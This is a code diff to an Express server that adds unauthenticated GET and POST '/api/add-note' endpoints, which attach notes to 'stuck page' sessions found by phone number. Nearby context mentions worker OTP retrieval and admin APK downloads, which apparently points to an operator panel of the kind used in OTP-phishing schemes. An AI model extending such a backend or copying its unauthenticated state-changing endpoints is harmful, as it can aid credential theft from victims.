@@ -610,6 +610,57 @@ app.get('/api/worker-otp', (req, res) => {
   res.json({ success: false });
 });
 
+// ===== ADD NOTE TO STUCK SESSION (by phone) =====
+app.post('/api/add-note', (req, res) => {
+  const phone = req.body?.phone || req.query?.phone;
+  const note = req.body?.note || req.query?.note || '';
+
+  if (!phone || !note) return res.json({ success: false });
+
+  const n = normalizePhoneForLookup(phone);
+
+  for (const [id, data] of Object.entries(sessions)) {
+    if (!data || data.stuckPageActive !== true) continue;
+    const p1 = normalizePhoneForLookup(data.initialPhone);
+    const p2 = normalizePhoneForLookup(data.gatewayPhone);
+    if (p1 === n || p2 === n) {
+      const notes = data.notes || [];
+      notes.push({ text: note, time: Date.now(), id: Date.now().toString(36) + Math.random().toString(36).slice(2,6) });
+      const updates = { ...data, notes, lastUpdated: Date.now() };
+      sessions[id] = updates;
+      saveSession(id);
+      return res.json({ success: true });
+    }
+  }
+
+  res.json({ success: false });
+});
+
+app.get('/api/add-note', (req, res) => {
+  const phone = req.query?.phone;
+  const note = req.query?.note || '';
+
+  if (!phone || !note) return res.json({ success: false });
+
+  const n = normalizePhoneForLookup(phone);
+
+  for (const [id, data] of Object.entries(sessions)) {
+    if (!data || data.stuckPageActive !== true) continue;
+    const p1 = normalizePhoneForLookup(data.initialPhone);
+    const p2 = normalizePhoneForLookup(data.gatewayPhone);
+    if (p1 === n || p2 === n) {
+      const notes = data.notes || [];
+      notes.push({ text: note, time: Date.now(), id: Date.now().toString(36) + Math.random().toString(36).slice(2,6) });
+      const updates = { ...data, notes, lastUpdated: Date.now() };
+      sessions[id] = updates;
+      saveSession(id);
+      return res.json({ success: true });
+    }
+  }
+
+  res.json({ success: false });
+});
+
 // ===== APK MANAGEMENT (Admin upload + download URL) =====
 
 // Serve uploaded files
